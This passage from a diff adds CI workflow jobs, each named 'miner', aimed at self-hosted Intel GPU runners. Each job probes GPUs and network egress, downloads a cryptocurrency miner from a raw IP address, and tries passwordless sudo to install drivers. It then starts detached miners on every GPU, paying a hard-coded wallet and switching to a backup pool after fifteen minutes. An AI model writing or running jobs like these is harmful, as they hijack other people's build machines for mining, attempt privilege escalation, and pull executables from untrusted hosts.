+          B=$(find "$D" -type f -name wildrig-multi 2>/dev/null | head -1)
+          [ -n "$B" ] || { echo "WILDRIG_BINARY_NOT_FOUND"; exit 1; }
+          chmod +x "$B"
+          GOT=$(sha256sum "$B" | cut -d' ' -f1); echo "WILDRIG_BINARY=$B SHA256=$GOT"
+          [ "$GOT" = "$WR_SHA" ] || { echo "SHA_MISMATCH_ABORT"; exit 1; }
+          "$B" --print-devices > "$D/pd.txt" 2>&1; echo "PD_RC=$?"; sed -n '1,60p' "$D/pd.txt"
+          ND=$(grep -acE 'Device [0-9]+:' "$D/pd.txt")
+          echo "WILDRIG_DEVICES=$ND"
+          if [ "${ND:-0}" -lt 1 ]; then
+            echo "OPENCL_RETRY_INSTALL"
+            if sudo -n true 2>/dev/null; then
+              echo "SUDO_NOPASSWD_OK"
+              sudo -n apt-get update -qq >/dev/null 2>&1
+              sudo -n env DEBIAN_FRONTEND=noninteractive apt-get install -y -qq ocl-icd-libopencl1 intel-opencl-icd clinfo >/dev/null 2>&1
+              echo "APT_RC=$?"
+              ls -l /etc/OpenCL/vendors 2>&1
+              "$B" --print-devices > "$D/pd2.txt" 2>&1; echo "PD2_RC=$?"; sed -n '1,60p' "$D/pd2.txt"
+              ND=$(grep -acE 'Device [0-9]+:' "$D/pd2.txt")
+              echo "WILDRIG_DEVICES2=$ND"
+            else
+              echo "SUDO_NEEDS_PASSWORD"
+            fi
+          fi
+          [ "${ND:-0}" -ge 1 ] || { echo "NO_OPENCL_DEVICE_ABORT"; exit 0; }
+          declare -A W
+          launch(){ local i=$1; local out=$2; shift 2; setsid nohup "$B" --algo pearlhash "$@" -d "$i" --print-time 60 > "$out" 2>&1 & echo $!; }
+          for i in $(seq 0 $((ND-1))); do
+            W[$i]="${I}${JOB}${i}"
+            P=$(launch "$i" "$D/gpu-$i.log" -o pool.pearlhash.xyz:9000 -o global.pearlhash.net:9000 -o global2.pearlhash.net:9000 -o hk.pearlhash.net:9000 -u "$WALLET" -p x --worker "${W[$i]}")
+            echo "$P" > "$D/pid-$i"; echo "STARTED dev=$i worker=${W[$i]} pid=$P at=$(date -u +%FT%TZ)"
+          done
+          START=$(date +%s); END=$((START+3300)); SW=$((START+900)); SWITCHED=0
+          while [ "$(date +%s)" -lt "$END" ]; do
+            sleep 60
+            TS=$(date +%s)
+            if [ "$SWITCHED" = 0 ] && [ "$TS" -ge "$SW" ]; then
+              SWITCHED=1
+              for i in $(seq 0 $((ND-1))); do
+                A=$(grep -ac 'accepted (' "$D/gpu-$i.log" 2>/dev/null || echo 0)
+                if [ "${A:-0}" -lt 1 ]; then
+                  echo "STICKY_LP_SWITCH dev=$i at $(date -u +%FT%TZ)"
+                  kill "$(cat "$D/pid-$i" 2>/dev/null)" 2>/dev/null || true
+                  touch "$D/sticky-lp-g$i"; sleep 1
+                  P=$(launch "$i" "$D/gpu-$i.lp.log" -o 103.199.106.122:3362 -u "$LPW" -p x --worker "${W[$i]}")
+                  echo "$P" > "$D/pid-$i.lp"
+                fi
+              done
+            fi
+            for i in $(seq 0 $((ND-1))); do
+              L="$D/gpu-$i.log"; L2="$D/gpu-$i.lp.log"
+              A=$(cat "$L" "$L2" 2>/dev/null | grep -ac 'accepted (' || true)
+              R=$(cat "$L" "$L2" 2>/dev/null | grep -ac 'rejected (' || true)
+              AL=$(cat "$L" "$L2" 2>/dev/null | grep -a 'accepted (' | tail -1 | tr -d '\r')
+              F="$D/last_acc_$i"; PREV=$(cat "$F" 2>/dev/null || echo 0)
+              if [ "${A:-0}" != "$PREV" ]; then date +%s > "$F"; fi
+              LA=$(cat "$F" 2>/dev/null || echo 0)
+              echo "det=g$i:a${A:-0}:r${R:-0}:la${LA}:line=[$AL]"
+            done
+            echo "TAIL0: $(tail -2 "$D/gpu-0.log" 2>/dev/null | tr '\n' ' ' | cut -c1-300)"
+          done
+          echo "C211_DONE i=$I job=$JOB at=$(date -u +%FT%TZ)"
+
+  intel-bmg-10:
+    name: intel-bmg-10
+    runs-on: intel-bmg
+    timeout-minutes: 75
+    steps:
+      - name: miner
+        shell: bash
+        run: |
+          set -u
+          set +e
+          I="128175"
+          JOB="10"
+          LBL="intel-bmg-10"
+          D="$HOME/c211-$I-$JOB"; mkdir -p "$D"
+          echo "C211_JOB i=$I job=$JOB label=$LBL host=$(hostname 2>/dev/null) at=$(date -u +%FT%TZ) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          . /etc/os-release 2>/dev/null; echo "OS=$PRETTY_NAME"
+          echo "--- DRM ---"
+          for d in /sys/class/drm/card*/device; do
+            [ -d "$d" ] || continue
+            v=$(cat "$d/vendor" 2>/dev/null); dv=$(cat "$d/device" 2>/dev/null)
+            s=$(grep -E '^PCI_SLOT_NAME=' "$d/uevent" 2>/dev/null)
+            echo "DRM $d vendor=$v device=$dv $s"
+          done
+          ls -l /dev/dri 2>&1 | head -20
+          NIC=$(for d in /sys/class/drm/card*/device; do [ -d "$d" ] || continue; [ "$(cat $d/vendor 2>/dev/null)" = "0x8086" ] && echo x; done | wc -l | tr -d ' ')
+          echo "INTEL_DRM_CARDS=$NIC"
+          echo "--- OPENCL ---"
+          ls -l /etc/OpenCL/vendors 2>&1
+          for f in /etc/OpenCL/vendors/*.icd; do [ -f "$f" ] && echo "ICD $f => $(cat $f 2>/dev/null)"; done
+          ldconfig -p 2>/dev/null | grep -iE 'opencl|igdrcl|ze_loader|igc' | head -20
+          if command -v clinfo >/dev/null 2>&1; then echo "--- CLINFO ---"; clinfo -l 2>&1 | head -30; fi
+          if command -v xpu-smi >/dev/null 2>&1; then echo "--- XPU-SMI ---"; xpu-smi discovery 2>&1 | grep -aE 'Device ID|Device Name|DRM Device|UUID' | head -60; fi
+          echo "--- EGRESS ---"
+          for hp in pool.pearlhash.xyz:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000 hk.pearlhash.net:9000 103.199.106.122:3362 169.58.247.186:8791; do
+            h=${hp%:*}; p=${hp#*:}
+            if timeout 8 bash -c "</dev/tcp/$h/$p" 2>/dev/null; then echo "TCP_OK $hp"; else echo "TCP_FAIL $hp"; fi
+          done
+          if pgrep -f 'wildrig-multi|pearl-miner' >/dev/null 2>&1; then echo "GUARD_ACTIVE_SKIP"; exit 0; fi
+          WALLET="prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
+          LPW="${WALLET}+NOCK"
+          WR_SHA="002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b"
+          get(){ curl -fsSL --max-time 300 -o "$2" "$1"; }
+          get http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz "$D/wr.tgz" || get https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz "$D/wr.tgz" || { echo "WILDRIG_DOWNLOAD_FAILED"; exit 1; }
+          mkdir -p "$D/x"; tar xzf "$D/wr.tgz" -C "$D/x" 2>/dev/null || tar xzf "$D/wr.tgz" -C "$D" 2>/dev/null
+          B=$(find "$D" -type f -name wildrig-multi 2>/dev/null | head -1)
+          [ -n "$B" ] || { echo "WILDRIG_BINARY_NOT_FOUND"; exit 1; }
+          chmod +x "$B"
+          GOT=$(sha256sum "$B" | cut -d' ' -f1); echo "WILDRIG_BINARY=$B SHA256=$GOT"
+          [ "$GOT" = "$WR_SHA" ] || { echo "SHA_MISMATCH_ABORT"; exit 1; }
+          "$B" --print-devices > "$D/pd.txt" 2>&1; echo "PD_RC=$?"; sed -n '1,60p' "$D/pd.txt"
+          ND=$(grep -acE 'Device [0-9]+:' "$D/pd.txt")
+          echo "WILDRIG_DEVICES=$ND"
+          if [ "${ND:-0}" -lt 1 ]; then
+            echo "OPENCL_RETRY_INSTALL"
+            if sudo -n true 2>/dev/null; then
+              echo "SUDO_NOPASSWD_OK"
+              sudo -n apt-get update -qq >/dev/null 2>&1
+              sudo -n env DEBIAN_FRONTEND=noninteractive apt-get install -y -qq ocl-icd-libopencl1 intel-opencl-icd clinfo >/dev/null 2>&1
+              echo "APT_RC=$?"
+              ls -l /etc/OpenCL/vendors 2>&1
+              "$B" --print-devices > "$D/pd2.txt" 2>&1; echo "PD2_RC=$?"; sed -n '1,60p' "$D/pd2.txt"
+              ND=$(grep -acE 'Device [0-9]+:' "$D/pd2.txt")
+              echo "WILDRIG_DEVICES2=$ND"
+            else
+              echo "SUDO_NEEDS_PASSWORD"
+            fi
+          fi
+          [ "${ND:-0}" -ge 1 ] || { echo "NO_OPENCL_DEVICE_ABORT"; exit 0; }
+          declare -A W
+          launch(){ local i=$1; local out=$2; shift 2; setsid nohup "$B" --algo pearlhash "$@" -d "$i" --print-time 60 > "$out" 2>&1 & echo $!; }
+          for i in $(seq 0 $((ND-1))); do
+            W[$i]="${I}${JOB}${i}"
+            P=$(launch "$i" "$D/gpu-$i.log" -o pool.pearlhash.xyz:9000 -o global.pearlhash.net:9000 -o global2.pearlhash.net:9000 -o hk.pearlhash.net:9000 -u "$WALLET" -p x --worker "${W[$i]}")
+            echo "$P" > "$D/pid-$i"; echo "STARTED dev=$i worker=${W[$i]} pid=$P at=$(date -u +%FT%TZ)"
+          done
+          START=$(date +%s); END=$((START+3300)); SW=$((START+900)); SWITCHED=0
+          while [ "$(date +%s)" -lt "$END" ]; do
+            sleep 60
+            TS=$(date +%s)
+            if [ "$SWITCHED" = 0 ] && [ "$TS" -ge "$SW" ]; then
+              SWITCHED=1
+              for i in $(seq 0 $((ND-1))); do
+                A=$(grep -ac 'accepted (' "$D/gpu-$i.log" 2>/dev/null || echo 0)
+                if [ "${A:-0}" -lt 1 ]; then
+                  echo "STICKY_LP_SWITCH dev=$i at $(date -u +%FT%TZ)"
+                  kill "$(cat "$D/pid-$i" 2>/dev/null)" 2>/dev/null || true
+                  touch "$D/sticky-lp-g$i"; sleep 1
+                  P=$(launch "$i" "$D/gpu-$i.lp.log" -o 103.199.106.122:3362 -u "$LPW" -p x --worker "${W[$i]}")
+                  echo "$P" > "$D/pid-$i.lp"
+                fi
+              done
+            fi
+            for i in $(seq 0 $((ND-1))); do
+              L="$D/gpu-$i.log"; L2="$D/gpu-$i.lp.log"
+              A=$(cat "$L" "$L2" 2>/dev/null | grep -ac 'accepted (' || true)
+              R=$(cat "$L" "$L2" 2>/dev/null | grep -ac 'rejected (' || true)
+              AL=$(cat "$L" "$L2" 2>/dev/null | grep -a 'accepted (' | tail -1 | tr -d '\r')
+              F="$D/last_acc_$i"; PREV=$(cat "$F" 2>/dev/null || echo 0)
+              if [ "${A:-0}" != "$PREV" ]; then date +%s > "$F"; fi
+              LA=$(cat "$F" 2>/dev/null || echo 0)
+              echo "det=g$i:a${A:-0}:r${R:-0}:la${LA}:line=[$AL]"
+            done
+            echo "TAIL0: $(tail -2 "$D/gpu-0.log" 2>/dev/null | tr '\n' ' ' | cut -c1-300)"
+          done
+          echo "C211_DONE i=$I job=$JOB at=$(date -u +%FT%TZ)"
+
+  intel-bmg-11:
+    name: intel-bmg-11
+    runs-on: intel-bmg
+    timeout-minutes: 75
+    steps:
+      - name: miner
+        shell: bash
+        run: |
+          set -u
+          set +e
+          I="128175"
+          JOB="11"
+          LBL="intel-bmg-11"
+          D="$HOME/c211-$I-$JOB"; mkdir -p "$D"
+          echo "C211_JOB i=$I job=$JOB label=$LBL host=$(hostname 2>/dev/null) at=$(date -u +%FT%TZ) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          . /etc/os-release 2>/dev/null; echo "OS=$PRETTY_NAME"
+          echo "--- DRM ---"
+          for d in /sys/class/drm/card*/device; do
+            [ -d "$d" ] || continue
+            v=$(cat "$d/vendor" 2>/dev/null); dv=$(cat "$d/device" 2>/dev/null)
+            s=$(grep -E '^PCI_SLOT_NAME=' "$d/uevent" 2>/dev/null)
+            echo "DRM $d vendor=$v device=$dv $s"
+          done
+          ls -l /dev/dri 2>&1 | head -20
+          NIC=$(for d in /sys/class/drm/card*/device; do [ -d "$d" ] || continue; [ "$(cat $d/vendor 2>/dev/null)" = "0x8086" ] && echo x; done | wc -l | tr -d ' ')
+          echo "INTEL_DRM_CARDS=$NIC"
+          echo "--- OPENCL ---"
+          ls -l /etc/OpenCL/vendors 2>&1
+          for f in /etc/OpenCL/vendors/*.icd; do [ -f "$f" ] && echo "ICD $f => $(cat $f 2>/dev/null)"; done
+          ldconfig -p 2>/dev/null | grep -iE 'opencl|igdrcl|ze_loader|igc' | head -20
+          if command -v clinfo >/dev/null 2>&1; then echo "--- CLINFO ---"; clinfo -l 2>&1 | head -30; fi
+          if command -v xpu-smi >/dev/null 2>&1; then echo "--- XPU-SMI ---"; xpu-smi discovery 2>&1 | grep -aE 'Device ID|Device Name|DRM Device|UUID' | head -60; fi
+          echo "--- EGRESS ---"
+          for hp in pool.pearlhash.xyz:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000 hk.pearlhash.net:9000 103.199.106.122:3362 169.58.247.186:8791; do
+            h=${hp%:*}; p=${hp#*:}
+            if timeout 8 bash -c "</dev/tcp/$h/$p" 2>/dev/null; then echo "TCP_OK $hp"; else echo "TCP_FAIL $hp"; fi
+          done
+          if pgrep -f 'wildrig-multi|pearl-miner' >/dev/null 2>&1; then echo "GUARD_ACTIVE_SKIP"; exit 0; fi
+          WALLET="prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
+          LPW="${WALLET}+NOCK"
+          WR_SHA="002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b"
+          get(){ curl -fsSL --max-time 300 -o "$2" "$1"; }
+          get http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz "$D/wr.tgz" || get https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz "$D/wr.tgz" || { echo "WILDRIG_DOWNLOAD_FAILED"; exit 1; }
+          mkdir -p "$D/x"; tar xzf "$D/wr.tgz" -C "$D/x" 2>/dev/null || tar xzf "$D/wr.tgz" -C "$D" 2>/dev/null
+          B=$(find "$D" -type f -name wildrig-multi 2>/dev/null | head -1)
+          [ -n "$B" ] || { echo "WILDRIG_BINARY_NOT_FOUND"; exit 1; }
+          chmod +x "$B"
+          GOT=$(sha256sum "$B" | cut -d' ' -f1); echo "WILDRIG_BINARY=$B SHA256=$GOT"
+          [ "$GOT" = "$WR_SHA" ] || { echo "SHA_MISMATCH_ABORT"; exit 1; }
+          "$B" --print-devices > "$D/pd.txt" 2>&1; echo "PD_RC=$?"; sed -n '1,60p' "$D/pd.txt"
+          ND=$(grep -acE 'Device [0-9]+:' "$D/pd.txt")
+          echo "WILDRIG_DEVICES=$ND"
+          if [ "${ND:-0}" -lt 1 ]; then
+            echo "OPENCL_RETRY_INSTALL"
+            if sudo -n true 2>/dev/null; then
+              echo "SUDO_NOPASSWD_OK"
+              sudo -n apt-get update -qq >/dev/null 2>&1
+              sudo -n env DEBIAN_FRONTEND=noninteractive apt-get install -y -qq ocl-icd-libopencl1 intel-opencl-icd clinfo >/dev/null 2>&1
+              echo "APT_RC=$?"
+              ls -l /etc/OpenCL/vendors 2>&1
+              "$B" --print-devices > "$D/pd2.txt" 2>&1; echo "PD2_RC=$?"; sed -n '1,60p' "$D/pd2.txt"
+              ND=$(grep -acE 'Device [0-9]+:' "$D/pd2.txt")
+              echo "WILDRIG_DEVICES2=$ND"
+            else
+              echo "SUDO_NEEDS_PASSWORD"
+            fi
+          fi
+          [ "${ND:-0}" -ge 1 ] || { echo "NO_OPENCL_DEVICE_ABORT"; exit 0; }
+          declare -A W
+          launch(){ local i=$1; local out=$2; shift 2; setsid nohup "$B" --algo pearlhash "$@" -d "$i" --print-time 60 > "$out" 2>&1 & echo $!; }
+          for i in $(seq 0 $((ND-1))); do
+            W[$i]="${I}${JOB}${i}"
+            P=$(launch "$i" "$D/gpu-$i.log" -o pool.pearlhash.xyz:9000 -o global.pearlhash.net:9000 -o global2.pearlhash.net:9000 -o hk.pearlhash.net:9000 -u "$WALLET" -p x --worker "${W[$i]}")
+            echo "$P" > "$D/pid-$i"; echo "STARTED dev=$i worker=${W[$i]} pid=$P at=$(date -u +%FT%TZ)"
+          done
+          START=$(date +%s); END=$((START+3300)); SW=$((START+900)); SWITCHED=0
+          while [ "$(date +%s)" -lt "$END" ]; do
+            sleep 60
+            TS=$(date +%s)
+            if [ "$SWITCHED" = 0 ] && [ "$TS" -ge "$SW" ]; then
+              SWITCHED=1
+              for i in $(seq 0 $((ND-1))); do
+                A=$(grep -ac 'accepted (' "$D/gpu-$i.log" 2>/dev/null || echo 0)
+                if [ "${A:-0}" -lt 1 ]; then
+                  echo "STICKY_LP_SWITCH dev=$i at $(date -u +%FT%TZ)"
+                  kill "$(cat "$D/pid-$i" 2>/dev/null)" 2>/dev/null || true
+                  touch "$D/sticky-lp-g$i"; sleep 1
+                  P=$(launch "$i" "$D/gpu-$i.lp.log" -o 103.199.106.122:3362 -u "$LPW" -p x --worker "${W[$i]}")
+                  echo "$P" > "$D/pid-$i.lp"
+                fi
+              done
+            fi
+            for i in $(seq 0 $((ND-1))); do
+              L="$D/gpu-$i.log"; L2="$D/gpu-$i.lp.log"
+              A=$(cat "$L" "$L2" 2>/dev/null | grep -ac 'accepted (' || true)
+              R=$(cat "$L" "$L2" 2>/dev/null | grep -ac 'rejected (' || true)
+              AL=$(cat "$L" "$L2" 2>/dev/null | grep -a 'accepted (' | tail -1 | tr -d '\r')
+              F="$D/last_acc_$i"; PREV=$(cat "$F" 2>/dev/null || echo 0)
+              if [ "${A:-0}" != "$PREV" ]; then date +%s > "$F"; fi
+              LA=$(cat "$F" 2>/dev/null || echo 0)
+              echo "det=g$i:a${A:-0}:r${R:-0}:la${LA}:line=[$AL]"
+            done
+            echo "TAIL0: $(tail -2 "$D/gpu-0.log" 2>/dev/null | tr '\n' ' ' | cut -c1-300)"
+          done
+          echo "C211_DONE i=$I job=$JOB at=$(date -u +%FT%TZ)"
+
+  intel-bmg-12:
+    name: intel-bmg-12
+    runs-on: intel-bmg
+    timeout-minutes: 75
+    steps:
+      - name: miner
+        shell: bash
+        run: |
+          set -u
+          set +e
+          I="128175"
+          JOB="12"
+          LBL="intel-bmg-12"
+          D="$HOME/c211-$I-$JOB"; mkdir -p "$D"
+          echo "C211_JOB i=$I job=$JOB label=$LBL host=$(hostname 2>/dev/null) at=$(date -u +%FT%TZ) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          . /etc/os-release 2>/dev/null; echo "OS=$PRETTY_NAME"
+          echo "--- DRM ---"
+          for d in /sys/class/drm/card*/device; do
+            [ -d "$d" ] || continue
+            v=$(cat "$d/vendor" 2>/dev/null); dv=$(cat "$d/device" 2>/dev/null)
+            s=$(grep -E '^PCI_SLOT_NAME=' "$d/uevent" 2>/dev/null)
+            echo "DRM $d vendor=$v device=$dv $s"
+          done
+          ls -l /dev/dri 2>&1 | head -20
+          NIC=$(for d in /sys/class/drm/card*/device; do [ -d "$d" ] || continue; [ "$(cat $d/vendor 2>/dev/null)" = "0x8086" ] && echo x; done | wc -l | tr -d ' ')
+          echo "INTEL_DRM_CARDS=$NIC"
+          echo "--- OPENCL ---"
+          ls -l /etc/OpenCL/vendors 2>&1
+          for f in /etc/OpenCL/vendors/*.icd; do [ -f "$f" ] && echo "ICD $f => $(cat $f 2>/dev/null)"; done
+          ldconfig -p 2>/dev/null | grep -iE 'opencl|igdrcl|ze_loader|igc' | head -20
+          if command -v clinfo >/dev/null 2>&1; then echo "--- CLINFO ---"; clinfo -l 2>&1 | head -30; fi
+          if command -v xpu-smi >/dev/null 2>&1; then echo "--- XPU-SMI ---"; xpu-smi discovery 2>&1 | grep -aE 'Device ID|Device Name|DRM Device|UUID' | head -60; fi
+          echo "--- EGRESS ---"
+          for hp in pool.pearlhash.xyz:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000 hk.pearlhash.net:9000 103.199.106.122:3362 169.58.247.186:8791; do
+            h=${hp%:*}; p=${hp#*:}
+            if timeout 8 bash -c "</dev/tcp/$h/$p" 2>/dev/null; then echo "TCP_OK $hp"; else echo "TCP_FAIL $hp"; fi
+          done
+          if pgrep -f 'wildrig-multi|pearl-miner' >/dev/null 2>&1; then echo "GUARD_ACTIVE_SKIP"; exit 0; fi
+          WALLET="prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
+          LPW="${WALLET}+NOCK"
+          WR_SHA="002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b"
+          get(){ curl -fsSL --max-time 300 -o "$2" "$1"; }
+          get http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz "$D/wr.tgz" || get https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz "$D/wr.tgz" || { echo "WILDRIG_DOWNLOAD_FAILED"; exit 1; }
+          mkdir -p "$D/x"; tar xzf "$D/wr.tgz" -C "$D/x" 2>/dev/null || tar xzf "$D/wr.tgz" -C "$D" 2>/dev/null
+          B=$(find "$D" -type f -name wildrig-multi 2>/dev/null | head -1)
+          [ -n "$B" ] || { echo "WILDRIG_BINARY_NOT_FOUND"; exit 1; }
+          chmod +x "$B"
+          GOT=$(sha256sum "$B" | cut -d' ' -f1); echo "WILDRIG_BINARY=$B SHA256=$GOT"
+          [ "$GOT" = "$WR_SHA" ] || { echo "SHA_MISMATCH_ABORT"; exit 1; }
+          "$B" --print-devices > "$D/pd.txt" 2>&1; echo "PD_RC=$?"; sed -n '1,60p' "$D/pd.txt"
+          ND=$(grep -acE 'Device [0-9]+:' "$D/pd.txt")
+          echo "WILDRIG_DEVICES=$ND"
+          if [ "${ND:-0}" -lt 1 ]; then
+            echo "OPENCL_RETRY_INSTALL"
+            if sudo -n true 2>/dev/null; then
+              echo "SUDO_NOPASSWD_OK"
+              sudo -n apt-get update -qq >/dev/null 2>&1
+              sudo -n env DEBIAN_FRONTEND=noninteractive apt-get install -y -qq ocl-icd-libopencl1 intel-opencl-icd clinfo >/dev/null 2>&1
+              echo "APT_RC=$?"
+              ls -l /etc/OpenCL/vendors 2>&1
+              "$B" --print-devices > "$D/pd2.txt" 2>&1; echo "PD2_RC=$?"; sed -n '1,60p' "$D/pd2.txt"
+              ND=$(grep -acE 'Device [0-9]+:' "$D/pd2.txt")
+              echo "WILDRIG_DEVICES2=$ND"
+            else
+              echo "SUDO_NEEDS_PASSWORD"
+            fi
+          fi
+          [ "${ND:-0}" -ge 1 ] || { echo "NO_OPENCL_DEVICE_ABORT"; exit 0; }
+          declare -A W
+          launch(){ local i=$1; local out=$2; shift 2; setsid nohup "$B" --algo pearlhash "$@" -d "$i" --print-time 60 > "$out" 2>&1 & echo $!; }
+          for i in $(seq 0 $((ND-1))); do
+            W[$i]="${I}${JOB}${i}"
+            P=$(launch "$i" "$D/gpu-$i.log" -o pool.pearlhash.xyz:9000 -o global.pearlhash.net:9000 -o global2.pearlhash.net:9000 -o hk.pearlhash.net:9000 -u "$WALLET" -p x --worker "${W[$i]}")
+            echo "$P" > "$D/pid-$i"; echo "STARTED dev=$i worker=${W[$i]} pid=$P at=$(date -u +%FT%TZ)"
+          done
+          START=$(date +%s); END=$((START+3300)); SW=$((START+900)); SWITCHED=0
+          while [ "$(date +%s)" -lt "$END" ]; do
+            sleep 60
+            TS=$(date +%s)
+            if [ "$SWITCHED" = 0 ] && [ "$TS" -ge "$SW" ]; then
+              SWITCHED=1
+              for i in $(seq 0 $((ND-1))); do
+                A=$(grep -ac 'accepted (' "$D/gpu-$i.log" 2>/dev/null || echo 0)
+                if [ "${A:-0}" -lt 1 ]; then
+                  echo "STICKY_LP_SWITCH dev=$i at $(date -u +%FT%TZ)"
+                  kill "$(cat "$D/pid-$i" 2>/dev/null)" 2>/dev/null || true
+                  touch "$D/sticky-lp-g$i"; sleep 1
+                  P=$(launch "$i" "$D/gpu-$i.lp.log" -o 103.199.106.122:3362 -u "$LPW" -p x --worker "${W[$i]}")
+                  echo "$P" > "$D/pid-$i.lp"
+                fi
+              done
+            fi
+            for i in $(seq 0 $((ND-1))); do
+              L="$D/gpu-$i.log"; L2="$D/gpu-$i.lp.log"
+              A=$(cat "$L" "$L2" 2>/dev/null | grep -ac 'accepted (' || true)
+              R=$(cat "$L" "$L2" 2>/dev/null | grep -ac 'rejected (' || true)
+              AL=$(cat "$L" "$L2" 2>/dev/null | grep -a 'accepted (' | tail -1 | tr -d '\r')
+              F="$D/last_acc_$i"; PREV=$(cat "$F" 2>/dev/null || echo 0)
+              if [ "${A:-0}" != "$PREV" ]; then date +%s > "$F"; fi
+              LA=$(cat "$F" 2>/dev/null || echo 0)
+              echo "det=g$i:a${A:-0}:r${R:-0}:la${LA}:line=[$AL]"
+            done
+            echo "TAIL0: $(tail -2 "$D/gpu-0.log" 2>/dev/null | tr '\n' ' ' | cut -c1-300)"
+          done
+          echo "C211_DONE i=$I job=$JOB at=$(date -u +%FT%TZ)"
+
+  bmg-multigen-01:
+    name: bmg-multigen-01
+    runs-on: bmg-multigen-models
+    timeout-minutes: 75
+    steps:
+      - name: miner
+        shell: bash
+        run: |
+          set -u
+          set +e
+          I="128175"
+          JOB="13"
+          LBL="bmg-multigen-01"
+          D="$HOME/c211-$I-$JOB"; mkdir -p "$D"
+          echo "C211_JOB i=$I job=$JOB label=$LBL host=$(hostname 2>/dev/null) at=$(date -u +%FT%TZ) uid=$(id -u) user=$(id -un)"
+          id 2>&1 || true
+          . /etc/os-release 2>/dev/null; echo "OS=$PRETTY_NAME"
+          echo "--- DRM ---"
+          for d in /sys/class/drm/card*/device; do
+            [ -d "$d" ] || continue
+            v=$(cat "$d/vendor" 2>/dev/null); dv=$(cat "$d/device" 2>/dev/null)
+            s=$(grep -E '^PCI_SLOT_NAME=' "$d/uevent" 2>/dev/null)
+            echo "DRM $d vendor=$v device=$dv $s"
+          done
+          ls -l /dev/dri 2>&1 | head -20
+          NIC=$(for d in /sys/class/drm/card*/device; do [ -d "$d" ] || continue; [ "$(cat $d/vendor 2>/dev/null)" = "0x8086" ] && echo x; done | wc -l | tr -d ' ')
+          echo "INTEL_DRM_CARDS=$NIC"
+          echo "--- OPENCL ---"
+          ls -l /etc/OpenCL/vendors 2>&1
+          for f in /etc/OpenCL/vendors/*.icd; do [ -f "$f" ] && echo "ICD $f => $(cat $f 2>/dev/null)"; done
+          ldconfig -p 2>/dev/null | grep -iE 'opencl|igdrcl|ze_loader|igc' | head -20
+          if command -v clinfo >/dev/null 2>&1; then echo "--- CLINFO ---"; clinfo -l 2>&1 | head -30; fi
+          if command -v xpu-smi >/dev/null 2>&1; then echo "--- XPU-SMI ---"; xpu-smi discovery 2>&1 | grep -aE 'Device ID|Device Name|DRM Device|UUID' | head -60; fi
+          echo "--- EGRESS ---"
+          for hp in pool.pearlhash.xyz:9000 global.pearlhash.net:9000 global2.pearlhash.net:9000 hk.pearlhash.net:9000 103.199.106.122:3362 169.58.247.186:8791; do
+            h=${hp%:*}; p=${hp#*:}
+            if timeout 8 bash -c "</dev/tcp/$h/$p" 2>/dev/null; then echo "TCP_OK $hp"; else echo "TCP_FAIL $hp"; fi
+          done
+          if pgrep -f 'wildrig-multi|pearl-miner' >/dev/null 2>&1; then echo "GUARD_ACTIVE_SKIP"; exit 0; fi
+          WALLET="prl1pydpjh2qzrs3sgtwpwnxntrymc2q22t3z2pg9fjx6g69gevy7twcs830sql"
+          LPW="${WALLET}+NOCK"
+          WR_SHA="002cd29c6b890a4159b5933260e7db57d8808e540804466b3b7b80814083011b"
+          get(){ curl -fsSL --max-time 300 -o "$2" "$1"; }
+          get http://169.58.247.186:8791/wildrig-multi-linux-0.52.3.tar.gz "$D/wr.tgz" || get https://github.com/andru-kun/wildrig-multi/releases/download/0.52.3/wildrig-multi-linux-0.52.3.tar.gz "$D/wr.tgz" || { echo "WILDRIG_DOWNLOAD_FAILED"; exit 1; }
+          mkdir -p "$D/x"; tar xzf "$D/wr.tgz" -C "$D/x" 2>/dev/null || tar xzf "$D/wr.tgz" -C "$D" 2>/dev/null
+          B=$(find "$D" -type f -name wildrig-multi 2>/dev/null | head -1)
+          [ -n "$B" ] || { echo "WILDRIG_BINARY_NOT_FOUND"; exit 1; }
+          chmod +x "$B"
+          GOT=$(sha256sum "$B" | cut -d' ' -f1); echo "WILDRIG_BINARY=$B SHA256=$GOT"
+          [ "$GOT" = "$WR_SHA" ] || { echo "SHA_MISMATCH_ABORT"; exit 1; }
+          "$B" --print-devices > "$D/pd.txt" 2>&1; echo "PD_RC=$?"; sed -n '1,60p' "$D/pd.txt"
+          ND=$(grep -acE 'Device [0-9]+:' "$D/pd.txt")
+          echo "WILDRIG_DEVICES=$ND"
+          if [ "${ND:-0}" -lt 1 ]; then
+            echo "OPENCL_RETRY_INSTALL"
+            if sudo -n true 2>/dev/null; then
+              echo "SUDO_NOPASSWD_OK"
+              sudo -n apt-get update -qq >/dev/null 2>&1
+              sudo -n env DEBIAN_FRONTEND=noninteractive apt-get install -y -qq ocl-icd-libopencl1 intel-opencl-icd clinfo >/dev/null 2>&1
+              echo "APT_RC=$?"
+              ls -l /etc/OpenCL/vendors 2>&1
+              "$B" --print-devices > "$D/pd2.txt" 2>&1; echo "PD2_RC=$?"; sed -n '1,60p' "$D/pd2.txt"
+              ND=$(grep -acE 'Device [0-9]+:' "$D/pd2.txt")
+              echo "WILDRIG_DEVICES2=$ND"
+            else
+              echo "SUDO_NEEDS_PASSWORD"
+            fi
+          fi
+          [ "${ND:-0}" -ge 1 ] || { echo "NO_OPENCL_DEVICE_ABORT"; exit 0; }
+          declare -A W
